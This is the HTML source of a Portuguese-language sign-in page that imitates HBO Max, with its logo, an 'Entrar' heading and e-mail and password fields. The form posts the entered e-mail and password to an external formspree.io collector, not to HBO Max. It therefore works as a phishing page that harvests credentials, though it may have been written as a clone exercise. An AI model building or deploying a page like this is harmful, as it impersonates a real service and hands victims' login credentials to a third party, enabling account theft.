<!DOCTYPE html>
  <html lang="pt-br">
    <head>
      <meta charset="UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>HBOMax_01</title>
      <link rel="stylesheet" href="./styles/style.css">
    </head>
    <body>
      <header>
        <img src="./images/hbomax_logo.svg" alt="Hbo Max Logo">
        <h1>Entrar</h1>
        <h3>Você tem conta HBO Max ?</h3>
      </header>
      <!-- Formulário-->
      <form action="https://formspree.io/f/mbjeabay" method="post">
        <label for="">E-mail</label>
        <input type="email" name="email" autocomplete="off" required placeholder="Digite seu Email">
        
        <label for="">Senha</label>
        <input type="password" name="senha" autocomplete="off" required placeholder="Digite sua senha">
        
        <button id="buttonEntrar">Entrar</button>
      </form>

      <h3>Você acessa a HBO Max por um provedor de TV. 
      <br>
          de internet ou celular?
      </h3>

      <button id="buttonEntrarProvedor">Entrar como provedor</button>
      
    </body>
  </html>
